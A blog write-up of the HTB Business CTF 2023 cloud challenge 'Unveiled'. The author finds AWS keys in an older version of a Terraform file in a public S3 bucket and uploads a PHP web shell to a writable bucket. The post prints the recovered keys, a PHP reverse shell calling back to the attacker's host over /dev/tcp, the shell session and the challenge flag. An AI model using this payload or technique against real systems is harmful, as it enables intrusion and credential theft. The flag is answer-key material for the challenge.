---
layout: post
title: HTB Business CTF 2023 Writeup - Cloud - Unveiled
date: 2023-07-18
type: post
tags:
- Writeup
- Hacking
- BusinessCTF
- CTF
permalink: /2023/07/HTBBusinessCTF/CloudUnveiled
img: 2023/07/HTBBusinessCTF/Unveiled/Unveiled.jpg
---

I this challenge I had to find AWS credentials in an exposed S3 buckets. And use them to upload a reverse shell.

> Easy

The challenged consisted of a simple static website. When I looked at the traffic in Caido, I saw that it was trying to load some JavaScript from `s3.unveiled.htb`. I added that domain to my hosts file and configure my `aws` cli to use it.

```bash
$ alias aws='aws --endpoint-url http://s3.unveiled.htb'
```

With the cli configured, I tried listing buckets and files.

```bash
$ aws s3 ls                                            
2023-07-16 07:54:09 unveiled-backups
2023-07-16 07:54:09 website-assets

$ aws s3 ls unveiled-backups
index.html
main.tf

$ aws s3 ls website-assets                  

An error occurred (InvalidClientTokenId) when calling the ListObjectsV2 operation: The security token included in the request is invalid
```

There were two buckets. I could not read what `website-assets` contained. But I had access to `unveiled-backups`. I downloaded the two files it contained.


```bash
$ aws s3api get-object --bucket unveiled-backups --key index.html index.html
$ aws s3api get-object --bucket unveiled-backups --key main.tf main.tf
```

The HTML file was the code for the site. The `main.tf` file contained the Terraform code to provision the two buckets.

```
variable "aws_access_key"{
  default = ""
}
variable "aws_secret_key"{
  default = ""
}

provider "aws" {
  access_key=var.aws_access_key
  secret_key=var.aws_secret_key
}

resource "aws_s3_bucket" "unveiled-backups" {
  bucket = "unveiled-backups"
  acl    = "private"
  tags = {
    Name        = "S3 Bucket"
    Environment = "Prod"
  }
  versioning {
    enabled = true
  }
}

resource "aws_s3_bucket_acl" "bucket_acl" {
  bucket = aws_s3_bucket.unveiled-backups.id
  acl    = "public-read"
}

resource "aws_s3_bucket" "website-assets" {
  bucket = "website-assets"
  acl    = "private"
}

data "aws_iam_policy_document" "allow_s3_access" {
  statement {
    principals {
      type        = "AWS"
      identifiers = ["683633011377"]
    }

    actions = [
      "s3:GetObject",
      "s3:ListBucket",
      "s3:PutObject"
    ]

    resources = [
      aws_s3_bucket.website-assets.arn,
      "${aws_s3_bucket.website-assets.arn}/*",
    ]
  }

resource "aws_s3_bucket_policy" "bucket_policy" {
  bucket = aws_s3_bucket.website-assets.id
  policy = data.aws_iam_policy_document.allow_s3_access.json
}
```

Sadly, it did not contain any credentials. I requested the list of versions from AWS.

```bash
$ aws s3api list-object-versions --bucket unveiled-backups
```

```json
{
    "Versions": [
        ...
        {
            "ETag": "\"9c9e9d85b28ce6bbbba93e0860389c65\"",
            "Size": 1107,
            "StorageClass": "STANDARD",
            "Key": "main.tf",
            "VersionId": "a3156f08-f993-4dbe-8e93-cc5495af3309",
            "IsLatest": true,
            "LastModified": "2023-07-16T11:54:11+00:00",
            "Owner": {
                "DisplayName": "webfile",
                "ID": "75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a"
            }
        },
        {
            "ETag": "\"4947c773e44f5973a9c3d37f24cb8e63\"",
            "Size": 1167,
            "StorageClass": "STANDARD",
            "Key": "main.tf",
            "VersionId": "26d116f4-4977-43d9-9f47-be4ff730fbf8",
            "IsLatest": false,
            "LastModified": "2023-07-16T11:54:11+00:00",
            "Owner": {
                "DisplayName": "webfile",
                "ID": "75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a"
            }
        }
    ]
}
```

There were two versions of the `main.tf` file. I extracted the older version.

```bash
$ aws s3api get-object --bucket unveiled-backups --key main.tf main.tf --version-id 26d116f4-4977-43d9-9f47-be4ff730fbf8

$ cp main.tf unveiled-backups/mainWithCreds.tf

$ diff unveiled-backups/mainWithCreds.tf unveiled-backups/main.tf 
2c2
<   default = "AKIA6CFMOGFLAHOPQTMA"
---
>   default = ""
5c5
<   default = "tLK3S3CNsXfj0mjPsIH2iCh5odYHMPDwSVxn7CB5"
---
>   default = ""
```

This one has credentials in it. I configured the cli to use them.

```bash
$ aws configure                                                                                                         
AWS Access Key ID [****************MDFE]: AKIA6CFMOGFLAHOPQTMA
AWS Secret Access Key [****************ue6g]: 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
Default region name [us-east-1]: 
Default output format [json]: 


$ aws s3 ls website-assets
2023-07-16 07:54:10      91790 background.jpg
2023-07-16 07:54:10       4372 index.html
```

This did not give me much more. I tried to find what else I could do with the credentials I had. Eventually I found that I could write into the bucket. 

I created a small PHP script and pushed it to the bucket.

```bash
$ cat test.php 
<?php
echo ('IN');

$ aws s3 cp test.php s3://website-assets/
upload: ./test.php to s3://website-assets/test.php
```

I tried accessing the file through a browser. I worked.

![RCE](/assets/images/2023/07/HTBBusinessCTF/Unveiled/RCE.png "RCE")

I modified the script to launch a reverse shell.

```php
<?php
`bash -c 'bash -i >& /dev/tcp/10.10.14.54/4444 0>&1'`;
```

I copied it to the server, access it and got a shell on my netcat listener.

From there, I just had to look around and find the flag.

```bash
www-data@unveiled:/var/www/html$ pwd
pwd
/var/www/html

www-data@unveiled:/var/www/html$ cd ..
cd ..

www-data@unveiled:/var/www$ ls
flag.txt
html

www-data@unveiled:/var/www$ cat flag.txt
cat flag.txt
HTB{th3_r3d_pl4n3ts_cl0ud_h4s_f4ll3n}
```